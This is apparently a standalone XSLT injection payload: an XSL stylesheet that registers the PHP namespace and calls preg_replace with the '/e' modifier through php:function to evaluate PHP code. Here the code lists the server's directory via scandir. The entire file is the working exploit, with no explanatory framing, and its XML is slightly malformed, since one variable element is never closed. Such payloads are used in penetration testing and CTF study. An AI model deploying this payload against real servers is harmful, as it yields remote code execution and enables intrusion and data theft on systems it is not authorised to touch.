<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
   <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:variable name="eval">
   eval("var_dump(scandir('.'));")
      <xsl:variable name="abc" select="php:function('preg_replace','/.*/e', $eval, '')" /> 
       <br />
   </body>
</html>
